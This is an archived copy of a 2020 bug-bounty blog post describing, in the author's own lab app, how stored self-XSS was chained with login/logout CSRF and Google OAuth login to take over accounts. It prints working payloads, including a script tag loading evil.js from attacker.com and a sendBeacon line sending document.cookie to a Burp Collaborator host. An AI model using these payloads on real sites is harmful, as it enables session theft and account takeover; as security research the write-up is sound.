---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-03-24_self-xss-to-account-takeover.md
original_filename: 2020-03-24_self-xss-to-account-takeover.md
title: Self XSS to Account Takeover
category: documents
detected_topics:
- oauth
- xss
- sso
- command-injection
- password-reset
- mfa
tags:
- imported
- documents
- oauth
- xss
- sso
- command-injection
- password-reset
- mfa
language: en
raw_sha256: 20a32074096ba3a1e8e3c309ef167acb9f968dd6b1e626c67067c43c444e77f4
text_sha256: 6ec51ecb7f2644a502b080533926b3c711bfc613710238e4b3d66fa059097ebb
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: true
---

# Self XSS to Account Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-03-24_self-xss-to-account-takeover.md
- Source Type: markdown
- Detected Topics: oauth, xss, sso, command-injection, password-reset, mfa
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: True
- Raw SHA256: `20a32074096ba3a1e8e3c309ef167acb9f968dd6b1e626c67067c43c444e77f4`
- Text SHA256: `6ec51ecb7f2644a502b080533926b3c711bfc613710238e4b3d66fa059097ebb`


## Content

---
title: "Self XSS to Account Takeover"
url: "https://medium.com/@ch3ckm4te/self-xss-to-account-takeover-72c89775cf8f"
authors: ["Ch3ckM4te"]
bugs: ["Account takeover", "XSS", "CSRF"]
publication_date: "2020-03-24"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4695
scraped_via: "browseros"
---

# Self XSS to Account Takeover

Self XSS to Account Takeover
Ch3ckM4te
Follow
6 min read
·
Mar 24, 2020

239

1

Hello everyone, this is my first blog. I came across this topic while searching ways to escalate one of my finding for self XSS in a bug bounty program.

Self XSS to Account Takeover

After hours of reading blogs and medium articles, I came to know about few techniques or should I say few ways to chain multiple low level bugs that can lead to account takeover.

I decided to not limit myself by just reading the blogs but to actually implement what I’ve learnt.

I already have the bug bounty program on which I have a finding of stored self XSS but after reading the escalation steps, I found it to be secure from other necessary low level bugs that were needed for escalation.

So, I decided to just practically try the method of chaining for escalation, hence created my own environment, a simple web application which demonstrates a set of vulnerabilities which are often considered out-of-scope, NA, P5 or just informational findings.

TL,DR;
-> I chained Stored Self XSS with Login/Logout CSRF and leveraged oAuth login functionality to steal user cookies

-> Scroll to the bottom to find POC video as well as complete code for the setup and exploit

Necessities:
Stored Self XSS
Login and Logout CSRF
Functionality of traditional login as well as oAuth implementation
Environment Setup

This web application has a login page which provides two functionalities:

Login with Email ID/Password
Login with Google

On logging into the account, if done with first method, it will fetch in some default values to be displayed in name, description etc. and on logging in with second method, it will fetch account details from Google account and display it on dashboard.

The dashboard page also have a comment functionality (created just for a sake of demonstrating stored self XSS).

Attack Overview:
We will create a malicious script on our (attacker) server
Embed it into attacker’s account by exploiting stored self XSS
Create a page which does following:

i. Logs out the victim user using Log out CSRF
ii. Login to attacker’s account using Email/Password functionality
iii. Execute stored XSS from attacker’s account which in-turn will load the external script (stored on attacker’s server)

4. Now, external script will start its execution in following way:

i. Logs out the attacker
ii. Login to victim’s account with the help of oAuth implementation
iii. Steal victim cookies & send it to attacker’s server

Detailed Explanation:
Step 1

We will create a malicious JavaScript file on our (attacker) server. Suppose its evil.js
Later in this article, we’ll look in detail for what to write in evil.js but for the meantime lets proceed with our attack.

Step 2

We know that comment functionality of dashboard is vulnerable to self-stored XSS. So use the following code to embed external JavaScript file.

<script src=http://attacker.com/evil.js></script>

This code will load the external JavaScript file from attacker’s server and browser will start its execution.

Step 3

(i) Logs out the victim user using Log out CSRF
On analysis of web application’s log out functionality (just looking to the logout request :P), we can see its simply making a GET request on logout.php to destroy cookies. So, we will use img tag to hit to the log out page which will destroy victim’s cookies.

Get Ch3ckM4te’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

<img src=http://localhost/app/logout.php>

This code will try to fetch the image from the specified source and while doing so, it will make a GET request to the source URL which by our application’s logic, logs-out the user.

(ii) Login to attacker’s account using Email/Password functionality
As the web application has feature to login with email ID/password also, we will write a simple JavaScript code to send POST request to the URL with our credentials, after which attacker’s session will gets activated.
Code for logging in to attacker’s account:

navigator.sendBeacon(“http://localhost/GoogleLogin/authLocal.php", new Blob([“username=admin&password=***REDACTED*** { type: “application/x-www-form-urlencoded” }))

JavaScript has a very useful method navigator.sendBeacon() which can be used to send POST request with some very specific content types. It simply takes the URL to visit along with the data and content type. Read more about it here.

Please note that we can also make invisible HTML form and send it using JavaScript to perform this action, sendBeacon just gives us a simple and much powerful method to use.

(iii) Execute stored XSS from attacker’s account
Now that we are logged in as attacker, we will redirect the victim to the page which executes our stored XSS (generally dashboard or edit_profile page).

Once JavaScript executes, it will load up the external JavaScript file and start its execution.

Step 4

Now, we have come to the point where we will see what the external JavaScript file (evil.js) will do.

(i) Logs out the attacker:
As we have seen previously, just hit the log out URL with img tag
<img src=http://127.0.0.1/app/logout.php>

Again, this will try to fetch image from source URL and make a GET request which will log out the user.

(ii) Login to victim account with oAuth functionality:
This is the critical step of the exploit, we have to carefully analyse the each request from initiation of the authentication process using oAuth till the time we get access to our application and on following each request, we will see a particular request (generally, it will look like /?auth=<some_code>) which is responsible for authenticating us to our application.
Code for logging in to victim’s account (for Google):

navigator.sendBeacon(“https://accounts.google.com/o/oauth2/auth?response_type=code&access_type=online&client_id=3195217987-usqr8lj019fd8df2rlihu32gl3qk725r.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%2FGoogleLogin%2Fg-callback.php&state&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fplus.login%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email&approval_prompt=auto","");

Here, method navigator.sendBeacon will make a POST request to the specified URL with no POST data.

It is important to note that here we are considering a scenario where the victim is already logged in to the Gmail (oAuth Provider) which is usually true in real scenarios.

(iii) Steal victim’s cookies
We will simply craft a JavaScript payload which will steal victim’s cookie and send it to our server (in this case, to our Burp Collaborator). Now, we have victim’s cookies and then we can proceed to use them and get their session.

var link=”http://random.burpcollaborator.net/VictimCookies="+document.cookie;
navigator.sendBeacon(link,””);

This will create a link of Burp’s Collaborator along with cookies of the logged in user and will send them to server using navigator.sendBeacon method.

Something more…

But generally websites have HttpOnly/Secure flag set on their session cookies, Right?
So, in that case, we may use JavaScript to perform some malicious action like email address change adding our mobile number which could later be used in account takeover by password reset functionality. I’ve linked a similar blog post at the last for the references.

Few points to be noted regarding my setup:
For demonstrating traditional login with email and password, I’ve not setup the complete SQL server. The authLocal.php is the file which contains hard-coded values for credentials
If you want to replicate my setup, ensure that you have organisation’s email address and not your personal one.
This is because Google doesn’t allow test users to perform oAuth authentication (Sign in with Google) without verification of our web application.
Here, I’ve used my college’s email address linked with google.

I would also like to admit that the demonstrated case has quite a lot of assumptions and needs to be modified as per situation. This is just a demonstration of what I’ve learned while researching for ways to escalate self stored XSS.

Any/All Suggestions Are Welcomed :)

Resources:
Mathias Karlsson’s Demo in Security Fest 2017
Geekboy’s AirBnb Article
Self-XSS to Good-XSS (Uber Bug Bounty)
Various other Medium articles, Use Google ;)

Full Source Code: GitHub’s Repository
Video POC: https://www.youtube.com/watch?v=NzkcE6csK98

At the end, I would like to thank my mentor Mr. Himanshu Giri (https://twitter.com/h0i0m0a0n0s0h0u) for motivating me to write my first blog and sharing my code on GitHub and also for introducing me to twitter (https://twitter.com/rohit_sonii).

Good Luck! Happy Hunting!
